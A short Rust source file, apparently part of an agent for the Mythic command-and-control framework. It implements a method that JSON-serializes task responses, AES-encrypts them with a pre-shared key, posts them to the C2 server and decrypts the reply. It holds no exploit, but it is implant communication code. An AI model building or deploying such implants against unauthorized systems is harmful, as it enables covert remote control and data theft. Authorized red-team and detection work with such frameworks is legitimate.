use super::types::{peer::Delegate, response::Response};
use crate::{
    C2Trait, MythicAgent, MythicC2, MythicError, MythicResult,
    agent::{
        aes256_packed, aes256_unpack,
        types::post_response::{ReqPostResponse, RespPostResponse},
    },
};

impl MythicAgent {
    pub fn post_response(
        &self,
        c2: &MythicC2,
        responses: Vec<Response>,
        delegates: Vec<Delegate>,
    ) -> MythicResult<RespPostResponse> {
        let req = ReqPostResponse::new(responses, delegates);
        let req_msg = serde_json::to_string(&req).map_err(|_| MythicError::Serialize)?;
        let req_packed = aes256_packed(&self.callback_uuid, &c2.get_aes_psk()?, req_msg)?;
        let resp_ppacked = c2.post_response(&req_packed)?;
        let resp_msg = aes256_unpack(&self.callback_uuid, &c2.get_aes_psk()?, resp_ppacked)?;
        serde_json::from_slice(&resp_msg).map_err(|_| MythicError::Deserialize)
    }
}
